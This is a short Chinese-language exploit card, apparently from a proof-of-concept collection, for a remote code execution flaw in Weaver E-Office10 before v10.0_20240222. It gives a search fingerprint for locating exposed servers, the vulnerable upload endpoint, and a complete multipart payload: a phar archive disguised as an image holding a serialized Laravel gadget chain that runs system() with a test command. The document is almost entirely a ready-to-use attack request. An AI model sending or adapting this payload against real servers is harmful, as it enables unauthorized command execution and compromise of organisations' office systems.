# 泛微E-Office10版本小于v10.0_20240222远程代码执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=jzdwsbic`

**请求体 / payload**
```
--jzdwsbic
Content-Disposition: form-data; name="Filedata"; filename="register.inc"
Content-Type: image/jpeg
GIF89a<?php __HALT_COMPILER(); ?>
D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
--jzdwsbic--
```
- **预期**：200　|　attachment_id